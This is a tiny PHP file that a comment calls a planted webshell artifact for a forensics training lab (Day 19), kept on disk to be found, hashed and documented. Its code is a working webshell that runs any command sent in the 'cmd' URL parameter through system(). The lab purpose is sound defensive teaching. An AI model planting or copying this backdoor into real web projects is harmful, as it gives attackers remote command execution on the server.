<?php
// IOC:WEBSHELL -- planted for the Day 19 lab only. This file simulates a
// webshell dropped through an unrestricted file-upload endpoint
// (/uploads.php). It is inert here (no live web server executes it in
// this container) -- it exists purely as a forensic artifact to find,
// hash, and document, exactly like a responder would find it on a real
// compromised host's disk.
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
